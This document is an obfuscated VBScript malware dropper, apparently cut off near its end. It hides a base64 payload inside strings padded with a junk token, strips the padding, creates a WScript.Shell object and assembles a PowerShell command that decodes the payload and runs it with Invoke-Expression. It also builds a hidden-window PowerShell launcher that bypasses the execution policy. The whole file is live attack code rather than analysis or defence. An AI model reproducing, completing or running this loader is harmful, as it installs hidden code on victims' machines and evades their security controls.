itbaktkqzbaqbmgkitbaktkqzbaq2mgkitbaktkqzbaq5mgkitbaktkqzbaq2mgkitbaktkqzbaqZmgkitbaktkqzbaqXmgkitbaktkqzbaqJmgkitbaktkqzbaq0mgkitbaktkqzbaqZmgkitbaktkqzbaqXmgkitbaktkqzbaqJmgkitbaktkqzbaqdmgkitbaktkqzbaqOmgkitbaktkqzbaqjmgkitbaktkqzbaqpmgkitbaktkqzbaqUmgkitbaktkqzbaqbmgkitbaktkqzbaq0mgkitbaktkqzbaqlmgkitbaktkqzbaqumgkitbaktkqzbaqdmgkitbaktkqzbaqDmgkitbaktkqzbaqMmgkitbaktkqzbaqymgkitbaktkqzbaqKmgkitbaktkqzbaqCmgkitbaktkqzbaqRmgkitbaktkqzbaqkmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaqFmgkitbaktkqzbaqzmgkitbaktkqzbaqcmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqkmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaqRmgkitbaktkqzbaqhmgkitbaktkqzbaqZmgkitbaktkqzbaqSmgkitbaktkqzbaq5mgkitbaktkqzbaqHmgkitbaktkqzbaqZmgkitbaktkqzbaqXmgkitbaktkqzbaqRmgkitbaktkqzbaqSmgkitbaktkqzbaqYmgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqnmgkitbaktkqzbaqZmgkitbaktkqzbaqSmgkitbaktkqzbaqgmgkitbaktkqzbaqwmgkitbaktkqzbaqLmgkitbaktkqzbaqDmgkitbaktkqzbaqQmgkitbaktkqzbaqpmgkitbaktkqzbaqLmgkitbaktkqzbaqlmgkitbaktkqzbaqRmgkitbaktkqzbaqvmgkitbaktkqzbaqQmgkitbaktkqzbaqXmgkitbaktkqzbaqJmgkitbaktkqzbaqymgkitbaktkqzbaqYmgkitbaktkqzbaqXmgkitbaktkqzbaqkmgkitbaktkqzbaqomgkitbaktkqzbaqKmgkitbaktkqzbaqSmgkitbaktkqzbaqwmgkitbaktkqzbaqwmgkitbaktkqzbaqKmgkitbaktkqzbaqTmgkitbaktkqzbaqsmgkitbaktkqzbaqkmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqjmgkitbaktkqzbaqbmgkitbaktkqzbaq2mgkitbaktkqzbaq5mgkitbaktkqzbaq2mgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqpmgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqjmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqnmgkitbaktkqzbaqPmgkitbaktkqzbaqSmgkitbaktkqzbaqRmgkitbaktkqzbaqkmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaqFmgkitbaktkqzbaqzmgkitbaktkqzbaqcmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqkmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaqRmgkitbaktkqzbaqhmgkitbaktkqzbaqZmgkitbaktkqzbaqSmgkitbaktkqzbaq5mgkitbaktkqzbaqHmgkitbaktkqzbaqZmgkitbaktkqzbaqXmgkitbaktkqzbaqRmgkitbaktkqzbaqSmgkitbaktkqzbaqYmgkitbaktkqzbaqWmgkitbaktkqzbaq5mgkitbaktkqzbaqnmgkitbaktkqzbaqZmgkitbaktkqzbaqSmgkitbaktkqzbaqgmgkitbaktkqzbaq0mgkitbaktkqzbaqLmgkitbaktkqzbaqCmgkitbaktkqzbaqRmgkitbaktkqzbaqtmgkitbaktkqzbaqamgkitbaktkqzbaqXmgkitbaktkqzbaqNmgkitbaktkqzbaqlmgkitbaktkqzbaqbmgkitbaktkqzbaqXmgkitbaktkqzbaqBmgkitbaktkqzbaqsmgkitbaktkqzbaqbmgkitbaktkqzbaq3mgkitbaktkqzbaqkmgkitbaktkqzbaqpmgkitbaktkqzbaqLmgkitbaktkqzbaqlmgkitbaktkqzbaqRmgkitbaktkqzbaqvmgkitbaktkqzbaqQmgkitbaktkqzbaqXmgkitbaktkqzbaqJmgkitbaktkqzbaqymgkitbaktkqzbaqYmgkitbaktkqzbaqXmgkitbaktkqzbaqkmgkitbaktkqzbaqomgkitbaktkqzbaqKmgkitbaktkqzbaqTmgkitbaktkqzbaqsmgkitbaktkqzbaqkmgkitbaktkqzbaqZmgkitbaktkqzbaqGmgkitbaktkqzbaqVmgkitbaktkqzbaqsmgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaqdmgkitbaktkqzbaqpmgkitbaktkqzbaqdmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqtmgkitbaktkqzbaqYmgkitbaktkqzbaqXmgkitbaktkqzbaqRmgkitbaktkqzbaqpmgkitbaktkqzbaqemgkitbaktkqzb"
ferromagnetism = ferromagnetism & "aqmmgkitbaktkqzbaqVmgkitbaktkqzbaqzmgkitbaktkqzbaqPmgkitbaktkqzbaqVmgkitbaktkqzbaqtmgkitbaktkqzbaqDmgkitbaktkqzbaqbmgkitbaktkqzbaq2mgkitbaktkqzbaq5mgkitbaktkqzbaq2mgkitbaktkqzbaqZmgkitbaktkqzbaqXmgkitbaktkqzbaqJmgkitbaktkqzbaq0mgkitbaktkqzbaqXmgkitbaktkqzbaqTmgkitbaktkqzbaqomgkitbaktkqzbaq6mgkitbaktkqzbaqVmgkitbaktkqzbaqGmgkitbaktkqzbaq9mgkitbaktkqzbaqCmgkitbaktkqzbaqYmgkitbaktkqzbaqXmgkitbaktkqzbaqNmgkitbaktkqzbaqlmgkitbaktkqzbaqNmgkitbaktkqzbaqjmgkitbaktkqzbaqRmgkitbaktkqzbaqTmgkitbaktkqzbaqdmgkitbaktkqzbaqHmgkitbaktkqzbaqJmgkitbaktkqzbaqpmgkitbaktkqzbaqbmgkitbaktkqzbaqmmgkitbaktkqzbaqcmgkitbaktkqzbaqomgkitbaktkqzbaqJmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqumgkitbaktkqzbaqYmgkitbaktkqzbaq2mgkitbaktkqzbaq9mgkitbaktkqzbaqumgkitbaktkqzbaqdmgkitbaktkqzbaqmmgkitbaktkqzbaqVmgkitbaktkqzbaqumgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaqVmgkitbaktkqzbaqumgkitbaktkqzbaqYmgkitbaktkqzbaq2mgkitbaktkqzbaqlmgkitbaktkqzbaqumgkitbaktkqzbaqZmgkitbaktkqzbaqymgkitbaktkqzbaqkmgkitbaktkqzbaqumgkitbaktkqzbaqUmgkitbaktkqzbaqmmgkitbaktkqzbaqVmgkitbaktkqzbaqwmgkitbaktkqzbaqbmgkitbaktkqzbaqGmgkitbaktkqzbaqFmgkitbaktkqzbaqjmgkitbaktkqzbaqZmgkitbaktkqzbaqSmgkitbaktkqzbaqgmgkitbaktkqzbaqnmgkitbaktkqzbaqQmgkitbaktkqzbaqSmgkitbaktkqzbaqcmgkitbaktkqzbaqsmgkitbaktkqzbaqJmgkitbaktkqzbaq0mgkitbaktkqzbaqAmgkitbaktkqzbaqnmgkitbaktkqzbaqKmgkitbaktkqzbaqSmgkitbaktkqzbaq5mgkitbaktkqzbaqSmgkitbaktkqzbaqZmgkitbaktkqzbaqXmgkitbaktkqzbaqBmgkitbaktkqzbaqsmgkitbaktkqzbaqYmgkitbaktkqzbaqWmgkitbaktkqzbaqNmgkitbaktkqzbaqlmgkitbaktkqzbaqKmgkitbaktkqzbaqCmgkitbaktkqzbaqdmgkitbaktkqzbaqAmgkitbaktkqzbaqJmgkitbaktkqzbaqymgkitbaktkqzbaqwmgkitbaktkqzbaqnmgkitbaktkqzbaqQmgkitbaktkqzbaqSmgkitbaktkqzbaqcmgkitbaktkqzbaqpmgkitbaktkqzbaqOmgkitbaktkqzbaqymgkitbaktkqzbaqRmgkitbaktkqzbaqjmgkitbaktkqzbaqZmgkitbaktkqzbaqXmgkitbaktkqzbaqBmgkitbaktkqzbaqomgkitbaktkqzbaqYmgkitbaktkqzbaqWmgkitbaktkqzbaqxmgkitbaktkqzbaqvmgkitbaktkqzbaqZmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqzmgkitbaktkqzbaqYmgkitbaktkqzbaq3mgkitbaktkqzbaqVmgkitbaktkqzbaqzmgkitbaktkqzbaqPmgkitbaktkqzbaqSmgkitbaktkqzbaqcmgkitbaktkqzbaq9mgkitbaktkqzbaqPmgkitbaktkqzbaqUmgkitbaktkqzbaqFmgkitbaktkqzbaqNmgkitbaktkqzbaqdmgkitbaktkqzbaqkmgkitbaktkqzbaqUmgkitbaktkqzbaqxmgkitbaktkqzbaqYmgkitbaktkqzbaqnmgkitbaktkqzbaqpmgkitbaktkqzbaqamgkitbaktkqzbaqbmgkitbaktkqzbaqlmgkitbaktkqzbaqRmgkitbaktkqzbaqWmgkitbaktkqzbaqRmgkitbaktkqzbaqmmgkitbaktkqzbaq1mgkitbaktkqzbaqkmgkitbaktkqzbaqdmgkitbaktkqzbaqlmgkitbaktkqzbaqEmgkitbaktkqzbaqymgkitbaktkqzbaqTmgkitbaktkqzbaqGmgkitbaktkqzbaqxmgkitbaktkqzbaqWmgkitbaktkqzbaqbmgkitbaktkqzbaqUmgkitbaktkqzbaqxmgkitbaktkqzbaqsmgkitbaktkqzbaqUmgkitbaktkqzbaqjmgkitbaktkqzbaqNmgkitbaktkqzbaqjmgkitbaktkqzbaqamgkitbaktkqzbaqEmgkitbaktkqzbaqImgkitbaktkqzbaqzmgkitbaktkqzbaqTmgkitbaktkqzbaqHmgkitbaktkqzbaqZmgkitbaktkqzbaqvmgkitbaktkqzbaqRmgkitbaktkqzbaqGmgkitbaktkqzbaqMmgkitbaktkqzbaqwmgkitbaktkqzbaqUmgkitbaktkqzbaqkmgkitbaktkqzbaqhmgkitbaktkqzbaqhmgkitbaktkqzbaqJmgkitbaktkqzbaqymgkitbaktkqzbaq5mgkitbaktkqzbaqSmgkitbaktkqzbaqZmgkitbaktkqzbaqXmgkitbaktkqzbaqBmgkitbaktkqzbaqsmgkitbaktkqzbaqYmgkitbaktkqzbaqWmgkitbaktkqzbaqNmgkitbaktkqzbaqlmgkitbaktkqzbaqKmgkitbaktkqzbaqCmgkitbaktkqzbaqcmgkitbaktkqzbaq7mgkitbaktkqzbaqPmgkitbaktkqzbaqCmgkitbaktkqzbaqcmgkitbaktkqzbaqsmgkitbaktkqzbaqJmgkitbaktkqzbaq3mgkitbaktkqzbaqQmgkitbaktkqzbaqnmgkitbaktkqzbaqKmgkitbaktkqzbaqTmgkitbaktkqzbaqsmgkitbaktkqzbaqkmgkitbaktkqzbaqcmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqwmgkitbaktkqzbaqdmgkitbaktkqzbaqGmgkitbaktkqzbaq9mgkitbaktkqzbaqtmgkitbaktkqzbaqZmgkitbaktkqzbaqXmgkitbaktkqzbaqJmgkitbaktkqzbaqpmgkitbaktkqzbaqcmgkitbaktkqzbaqzmgkitbaktkqzbaq1mgkitbaktkqzbaqbmgkitbaktkqzbaqQmgkitbaktkqzbaq2mgkitbaktkqzbaq9mgkitbaktkqzbaqumgkitbaktkqzbaqdmgkitbaktkqzbaqmmgkitbaktkqzbaqVmgkitbaktkqzbaqymgkitbaktkqzbaqdmgkitbaktkqzbaqFmgkitbaktkqzbaq0mgkitbaktkqzbaq6mgkitbaktkqzbaqOmgkitbaktkqzbaqkmgkitbaktkqzbaqZmgkitbaktkqzbaqymgkitbaktkqzbaqbmgkitbaktkqzbaq2mgkitbaktkqzbaq1mgkitbaktkqzbaqCmgkitbaktkqzbaqYmgkitbaktkqzbaqXmgkitbaktkqzbaqNmgkitbaktkqzbaqlmgkitbaktkqzbaqNmgkitbaktkqzbaqjmgkitbaktkqzbaqRmgkitbaktkqzbaqTmgkitbaktkqzbaqdmgkitbaktkqzbaqHmgkitbaktkqzbaqJmgkitbaktkqzbaqpmgkitbaktkqzbaqbmgkitbaktkqzbaqmmgkitbaktkqzbaqcmgkitbaktkqzbaqomgkitbaktkqzbaqJmgkitbaktkqzbaqGmgkitbaktkqzbaqRmgkitbaktkqzbaqlmgkitbaktkqzbaqbmgkitbaktkqzbaqGmgkitbaktkqzbaqVmgkitbaktkqzbaqnmgkitbaktkqzbaqamgkitbaktkqzbaqXmgkitbaktkqzbaqRmgkitbaktkqzbaqpmgkitbaktkqzbaqbmgkitbaktkqzbaqWmgkitbaktkqzbaqFmgkitbaktkqzbaq0mgkitbaktkqzbaqamgkitbaktkqzbaqXmgkitbaktkqzbaqpmgkitbaktkqzbaqlmgkitbaktkqzbaqcmgkitbaktkqzbaqymgkitbaktkqzbaqkmgkitbaktkqzbaq7mgkitbaktkqzbaqJmgkitbaktkqzbaqGmgkitbaktkqzbaqhmgkitbaktkqzbaqhmgkitbaktkqzbaqbmgkitbaktkqzbaqmmgkitbaktkqzbaqdmgkitbaktkqzbaq0mgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaq1mgkitbaktkqzbaqlmgkitbaktkqzbaqcmgkitbaktkqzbaqzmgkitbaktkqzbaq1mgkitbaktkqzbaqbmgkitbaktkqzbaqUmgkitbaktkqzbaqmmgkitbaktkqzbaqVmgkitbaktkqzbaqmmgkitbaktkqzbaqbmgkitbaktkqzbaqGmgkitbaktkqzbaqVmgkitbaktkqzbaqjmgkitbaktkqzbaqdmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqvmgkitbaktkqzbaqbmgkitbaktkqzbaqimgkitbaktkqzbaq5mgkitbaktkqzbaqBmgkitbaktkqzbaqcmgkitbaktkqzbaq3mgkitbaktkqzbaqNmgkitbaktkqzbaqlmgkitbaktkqzbaqbmgkitbaktkqzbaqWmgkitbaktkqzbaqJmgkitbaktkqzbaqsmgkitbaktkqzbaqemgkitbaktkqzbaqVmgkitbaktkqzbaq0mgkitbaktkqzbaq6mgkitbaktkqzbaqOmgkitbaktkqzbaqkmgkitbaktkqzbaqxmgkitbaktkqzbaqvmgkitbaktkqzbaqYmgkitbaktkqzbaqWmgkitbaktkqzbaqQmgkitbaktkqzbaqomgkitbaktkqzbaqJmgkitbaktkqzbaqHmgkitbaktkqzbaqBmgkitbaktkqzbaqpmgkitbaktkqzbaqcmgkitb"
ferromagnetism = ferromagnetism & "aktkqzbaqHmgkitbaktkqzbaqRmgkitbaktkqzbaqvmgkitbaktkqzbaqbmgkitbaktkqzbaqWmgkitbaktkqzbaqVmgkitbaktkqzbaqymgkitbaktkqzbaqamgkitbaktkqzbaqXmgkitbaktkqzbaqMmgkitbaktkqzbaqpmgkitbaktkqzbaqOmgkitbaktkqzbaqymgkitbaktkqzbaqRmgkitbaktkqzbaqimgkitbaktkqzbaqdmgkitbaktkqzbaqWmgkitbaktkqzbaqNmgkitbaktkqzbaqumgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaq1mgkitbaktkqzbaqpmgkitbaktkqzbaqYmgkitbaktkqzbaqTmgkitbaktkqzbaq1mgkitbaktkqzbaqAmgkitbaktkqzbaqKmgkitbaktkqzbaqCmgkitbaktkqzbaqRmgkitbaktkqzbaqjmgkitbaktkqzbaqZmgkitbaktkqzbaqXmgkitbaktkqzbaqBmgkitbaktkqzbaqomgkitbaktkqzbaqYmgkitbaktkqzbaqWmgkitbaktkqzbaqxmgkitbaktkqzbaqvmgkitbaktkqzbaqZmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqzmgkitbaktkqzbaqYmgkitbaktkqzbaq3mgkitbaktkqzbaqVmgkitbaktkqzbaqzmgkitbaktkqzbaqLmgkitbaktkqzbaqCmgkitbaktkqzbaqcmgkitbaktkqzbaqnmgkitbaktkqzbaqLmgkitbaktkqzbaqCmgkitbaktkqzbaqcmgkitbaktkqzbaqnmgkitbaktkqzbaqLmgkitbaktkqzbaqCmgkitbaktkqzbaqcmgkitbaktkqzbaqnmgkitbaktkqzbaqLmgkitbaktkqzbaqCmgkitbaktkqzbaqdmgkitbaktkqzbaqNmgkitbaktkqzbaqUmgkitbaktkqzbaq0mgkitbaktkqzbaqJmgkitbaktkqzbaq1mgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaqxmgkitbaktkqzbaqkmgkitbaktkqzbaqJmgkitbaktkqzbaqymgkitbaktkqzbaqwmgkitbaktkqzbaqnmgkitbaktkqzbaqJmgkitbaktkqzbaqymgkitbaktkqzbaqwmgkitbaktkqzbaqnmgkitbaktkqzbaqJmgkitbaktkqzbaqymgkitbaktkqzbaqwmgkitbaktkqzbaqnmgkitbaktkqzbaqJmgkitbaktkqzbaqymgkitbaktkqzbaqwmgkitbaktkqzbaqnmgkitbaktkqzbaqJmgkitbaktkqzbaqymgkitbaktkqzbaqwmgkitbaktkqzbaqnmgkitbaktkqzbaqQmgkitbaktkqzbaqzmgkitbaktkqzbaqpmgkitbaktkqzbaqcmgkitbaktkqzbaqVmgkitbaktkqzbaqXmgkitbaktkqzbaqNmgkitbaktkqzbaqlmgkitbaktkqzbaqcmgkitbaktkqzbaqnmgkitbaktkqzbaqNmgkitbaktkqzbaqcmgkitbaktkqzbaqUmgkitbaktkqzbaqHmgkitbaktkqzbaqVmgkitbaktkqzbaqimgkitbaktkqzbaqbmgkitbaktkqzbaqGmgkitbaktkqzbaqlmgkitbaktkqzbaqjmgkitbaktkqzbaqXmgkitbaktkqzbaqEmgkitbaktkqzbaqRmgkitbaktkqzbaqvmgkitbaktkqzbaqdmgkitbaktkqzbaq2mgkitbaktkqzbaq5mgkitbaktkqzbaqsmgkitbaktkqzbaqbmgkitbaktkqzbaq2mgkitbaktkqzbaqFmgkitbaktkqzbaqkmgkitbaktkqzbaqcmgkitbaktkqzbaqymgkitbaktkqzbaqcmgkitbaktkqzbaqsmgkitbaktkqzbaqJmgkitbaktkqzbaq2mgkitbaktkqzbaqVmgkitbaktkqzbaqymgkitbaktkqzbaqemgkitbaktkqzbaqXmgkitbaktkqzbaqRmgkitbaktkqzbaqomgkitbaktkqzbaqYmgkitbaktkqzbaqWmgkitbaktkqzbaqNmgkitbaktkqzbaqhmgkitbaktkqzbaqJmgkitbaktkqzbaqymgkitbaktkqzbaqwmgkitbaktkqzbaqnmgkitbaktkqzbaqJmgkitbaktkqzbaqymgkitbaktkqzbaqwmgkitbaktkqzbaqnmgkitbaktkqzbaqJmgkitbaktkqzbaqymgkitbaktkqzbaqwmgkitbaktkqzbaqnmgkitbaktkqzbaqJmgkitbaktkqzbaqymgkitbaktkqzbaqwmgkitbaktkqzbaqnmgkitbaktkqzbaqbmgkitbaktkqzbaqWmgkitbaktkqzbaqlmgkitbaktkqzbaq6mgkitbaktkqzbaqdmgkitbaktkqzbaqWmgkitbaktkqzbaqFmgkitbaktkqzbaqtmgkitbaktkqzbaqZmgkitbaktkqzbaqSmgkitbaktkqzbaqcmgkitbaktkqzbaqsmgkitbaktkqzbaqJmgkitbaktkqzbaqzmgkitbaktkqzbaqImgkitbaktkqzbaqnmgkitbaktkqzbaqLmgkitbaktkqzbaqCmgkitbaktkqzbaqcmgkitbaktkqzbaqnmgkitbaktkqzbaqKmgkitbaktkqzbaqTmgkitbaktkqzbaqsmgkitbaktkqzbaqkmgkitbaktkqzbaqamgkitbaktkqzbaqGmgkitbaktkqzbaqFmgkitbaktkqzbaqumgkitbaktkqzbaqZmgkitbaktkqzbaq3mgkitbaktkqzbaqRmgkitbaktkqzbaqpmgkitbaktkqzbaqbmgkitbaktkqzbaqWmgkitbaktkqzbaqVmgkitbaktkqzbaqzmgkitbaktkqzbaqLmgkitbaktkqzbaqkmgkitbaktkqzbaqdmgkitbaktkqzbaqlmgkitbaktkqzbaqdmgkitbaktkqzbaqFmgkitbaktkqzbaqRmgkitbaktkqzbaq5mgkitbaktkqzbaqcmgkitbaktkqzbaqGmgkitbaktkqzbaqUmgkitbaktkqzbaqomgkitbaktkqzbaqJmgkitbaktkqzbaqGmgkitbaktkqzbaq5mgkitbaktkqzbaqvmgkitbaktkqzbaqbmgkitbaktkqzbaqmmgkitbaktkqzbaqFmgkitbaktkqzbaqumgkitbaktkqzbaqcmgkitbaktkqzbaq3mgkitbaktkqzbaqdmgkitbaktkqzbaqlmgkitbaktkqzbaqcmgkitbaktkqzbaqimgkitbaktkqzbaqkmgkitbaktkqzbaqumgkitbaktkqzbaqRmgkitbaktkqzbaq2mgkitbaktkqzbaqVmgkitbaktkqzbaq0mgkitbaktkqzbaqTmgkitbaktkqzbaqWmgkitbaktkqzbaqVmgkitbaktkqzbaq0mgkitbaktkqzbaqamgkitbaktkqzbaqGmgkitbaktkqzbaq9mgkitbaktkqzbaqkmgkitbaktkqzbaqKmgkitbaktkqzbaqCmgkitbaktkqzbaqRmgkitbaktkqzbaqvmgkitbaktkqzbaqbmgkitbaktkqzbaq3mgkitbaktkqzbaqBmgkitbaktkqzbaqomgkitbaktkqzbaqemgkitbaktkqzbaqXmgkitbaktkqzbaqRmgkitbaktkqzbaqlmgkitbaktkqzbaqKmgkitbaktkqzbaqSmgkitbaktkqzbaq5mgkitbaktkqzbaqJmgkitbaktkqzbaqbmgkitbaktkqzbaqnmgkitbaktkqzbaqZmgkitbaktkqzbaqvmgkitbaktkqzbaqamgkitbaktkqzbaq2mgkitbaktkqzbaqUmgkitbaktkqzbaqomgkitbaktkqzbaqJmgkitbaktkqzbaqHmgkitbaktkqzbaqBmgkitbaktkqzbaqymgkitbaktkqzbaqbmgkitbaktkqzbaq3mgkitbaktkqzbaqRmgkitbaktkqzbaqymgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaq1mgkitbaktkqzbaqhmgkitbaktkqzbaqdmgkitbaktkqzbaqGmgkitbaktkqzbaqEmgkitbaktkqzbaqsmgkitbaktkqzbaqJmgkitbaktkqzbaqGmgkitbaktkqzbaqJmgkitbaktkqzbaq1mgkitbaktkqzbaqYmgkitbaktkqzbaq2mgkitbaktkqzbaq5mgkitbaktkqzbaqlmgkitbaktkqzbaqbmgkitbaktkqzbaqWmgkitbaktkqzbaqlmgkitbaktkqzbaqhmgkitbaktkqzbaqKmgkitbaktkqzbaqTmgkitbaktkqzbaqsmgkitbaktkqzbaqkmgkitbaktkqzbaqYmgkitbaktkqzbaqmmgkitbaktkqzbaqFmgkitbaktkqzbaqzmgkitbaktkqzbaqZmgkitbaktkqzbaqWmgkitbaktkqzbaq1mgkitbaktkqzbaqlmgkitbaktkqzbaqbmgkitbaktkqzbaqnmgkitbaktkqzbaqRmgkitbaktkqzbaqsmgkitbaktkqzbaqamgkitbaktkqzbaqWmgkitbaktkqzbaqtmgkitbaktkqzbaqlmgkitbaktkqzbaqLmgkitbaktkqzbaqkmgkitbaktkqzbaqRmgkitbaktkqzbaqpmgkitbaktkqzbaqcmgkitbaktkqzbaq3mgkitbaktkqzbaqBmgkitbaktkqzbaqvmgkitbaktkqzbaqcmgkitbaktkqzbaq2mgkitbaktkqzbaqUmgkitbaktkqzbaqomgkitbaktkqzbaqKmgkitbaktkqzbaqTmgkitbaktkqzbaqsmgkitbaktkqzbaqkmgkitbaktkqzbaqamgkitbaktkqzbaq2mgkitbaktkqzbaqlmgkitbaktkqzbaqkmgkitbaktkqzbaqcmgkitbaktkqzbaq2mgkitbaktkqzbaqtmgkitbaktkqzbaqpmgkitbaktkqzbaqbmgkitbaktkqzbaqimgkitbaktkqzbaq5mgkitbaktkqzbaqEmgkitbaktkqzbaqamgkitbaktkqzbaqXmgkitbaktkqzbaqNmgkitbaktkqzbaqwmgkitbaktkqzbaqbmgkitbaktkqzbaq3mgkitbaktkqzbaqNmgkitbaktkqzbaqlmgkitbaktkqzbaqKmgkitbaktkqzbaqCmgkitbaktkqzbaqkmgkitbaktkqzbaq=mgkitbaktkqzbaq"
ferromagnetism = Replace(ferromagnetism, "mgkitbaktkqzbaq", "")
Set cotransfer = CreateObject("WScript.Shell")
WTlK = "mgkitbaktkqzbaq$ferromagnetismmgkitbaktkqzbaq='mgkitbaktkqzbaq" & ferromagnetism & "mgkitbaktkqzbaq';"
WTlK = WTlK & "mgkitbaktkqzbaq$brainlikemgkitbaktkqzbaq=mgkitbaktkqzbaq"
WTlK = WTlK & "mgkitbaktkqzbaq[mgkitbaktkqzbaqSmgkitbaktkqzbaqymgkitbaktkqzbaq"
WTlK = WTlK & "mgkitbaktkqzbaqsmgkitbaktkqzbaqtmgkitbaktkqzbaqemgkitbaktkqzbaq"
WTlK = WTlK & "mgkitbaktkqzbaqmmgkitbaktkqzbaq.mgkitbaktkqzbaqTmgkitbaktkqzbaqemgkitbaktkqzbaq"
WTlK = WTlK & "mgkitbaktkqzbaqxmgkitbaktkqzbaqtmgkitbaktkqzbaq.mgkitbaktkqzbaqEmgkitbaktkqzbaqnmgkitbaktkqzbaqcmgkitbaktkqzbaqomgkitbaktkqzbaq"
WTlK = WTlK & "mgkitbaktkqzbaqdmgkitbaktkqzbaqimgkitbaktkqzbaqnmgkitbaktkqzbaqgmgkitbaktkqzbaq]mgkitbaktkqzbaq:mgkitbaktkqzbaq"
WTlK = WTlK & "mgkitbaktkqzbaq:mgkitbaktkqzbaqUmgkitbaktkqzbaqTmgkitbaktkqzbaqFmgkitbaktkqzbaq8mgkitbaktkqzbaq"
WTlK = WTlK & "mgkitbaktkqzbaq.mgkitbaktkqzbaqGmgkitbaktkqzbaqemgkitbaktkqzbaqtmgkitbaktkqzbaqSmgkitbaktkqzbaq"
WTlK = WTlK & "mgkitbaktkqzbaqtmgkitbaktkqzbaqrmgkitbaktkqzbaqimgkitbaktkqzbaqnmgkitbaktkqzbaqgmgkitbaktkqzbaq(mgkitbaktkqzbaq"
WTlK = WTlK & "mgkitbaktkqzbaq[mgkitbaktkqzbaqSmgkitbaktkqzbaqymgkitbaktkqzbaqsmgkitbaktkqzbaqtmgkitbaktkqzbaqemgkitbaktkqzbaqmmgkitbaktkqzbaq"
WTlK = WTlK & "mgkitbaktkqzbaq.mgkitbaktkqzbaqCmgkitbaktkqzbaqomgkitbaktkqzbaqnmgkitbaktkqzbaqvmgkitbaktkqzbaqemgkitbaktkqzbaqrmgkitbaktkqzbaq"
WTlK = WTlK & "mgkitbaktkqzbaqtmgkitbaktkqzbaq]mgkitbaktkqzbaq:mgkitbaktkqzbaq:mgkitbaktkqzbaqmgkitbaktkqzbaqFmgkitbaktkqzbaqrmgkitbaktkqzbaqomgkitbaktkqzbaqmmgkitbaktkqzbaq"
WTlK = WTlK & "mgkitbaktkqzbaqBmgkitbaktkqzbaqamgkitbaktkqzbaqsmgkitbaktkqzbaqemgkitbaktkqzbaq6mgkitbaktkqzbaq"
WTlK = WTlK & "mgkitbaktkqzbaq4mgkitbaktkqzbaqSmgkitbaktkqzbaqtmgkitbaktkqzbaq"
WTlK = WTlK & "mgkitbaktkqzbaqrmgkitbaktkqzbaqimgkitbaktkqzbaqnmgkitbaktkqzbaq"
WTlK = WTlK & "mgkitbaktkqzbaqgmgkitbaktkqzbaq(mgkitbaktkqzbaq$mgkitbaktkqzbaqferromagnetismmgkitbaktkqzbaq)mgkitbaktkqzbaq)mgkitbaktkqzbaq;mgkitbaktkqzbaq"
WTlK = WTlK & "mgkitbaktkqzbaqImgkitbaktkqzbaqnmgkitbaktkqzbaq"
WTlK = WTlK & "mgkitbaktkqzbaqvmgkitbaktkqzbaqomgkitbaktkqzbaqkmgkitbaktkqzbaqemgkitbaktkqzbaq-mgkitbaktkqzbaqEmgkitbaktkqzbaqxmgkitbaktkqzbaqpmgkitbaktkqzbaq"
WTlK = WTlK & "mgkitbaktkqzbaqrmgkitbaktkqzbaqemgkitbaktkqzbaqsmgkitbaktkqzbaqsmgkitbaktkqzbaqimgkitbaktkqzbaqomgkitbaktkqzbaqnmgkitbaktkqzbaq mgkitbaktkqzbaq$brainlikemgkitbaktkqzbaq"
WTlK = Replace(WTlK, "mgkitbaktkqzbaq", "")
graille = "mgkitbaktkqzbaqpmgkitbaktkqzbaqomgkitbaktkqzbaqwmgkitbaktkqzbaq"
graille = graille & "mgkitbaktkqzbaqemgkitbaktkqzbaqrmgkitbaktkqzbaqsmgkitbaktkqzbaqhmgkitbaktkqzbaqemgkitbaktkqzbaq"
graille = graille & "mgkitbaktkqzbaqlmgkitbaktkqzbaql mgkitbaktkqzbaq-mgkitbaktkqzbaqwmgkitbaktkqzbaq"
graille = graille & " mgkitbaktkqzbaqhmgkitbaktkqzbaqimgkitbaktkqzbaqdmgkitbaktkqzbaqdmgkitbaktkqzbaqemgkitbaktkqzbaq"
graille = graille & "mgkitbaktkqzbaqn mgkitbaktkqzbaq-mgkitbaktkqzbaqnmgkitbaktkqzbaqomgkitbaktkqzbaqpmgkitbaktkqzbaq"
graille = graille & "mgkitbaktkqzbaqrmgkitbaktkqzbaqomgkitbaktkqzbaqfmgkitbaktkqzbaqimgkitbaktkqzbaq"
graille = graille & "mgkitbaktkqzbaqlmgkitbaktkqzbaqe mgkitbaktkqzbaq-mgkitbaktkqzbaqemgkitbaktkqzbaq"
graille = graille & "mgkitbaktkqzbaqpmgkitbaktkqzbaq bmgkitbaktkqzbaqymgkitbaktkqzbaq"
graille = graille & "mgkitbaktkqzbaqpmgkitbaktkqzbaqamgkitbaktkqzbaqsmgkitbaktkqzbaq"
graille = graille & "mgkitbaktkqzbaqsmgkitbaktkqzbaq -mgkitbaktkqzbaqcmgkitbaktkqzbaq "
graille = Replace(graille, "mgkitbaktkqzbaq", "")
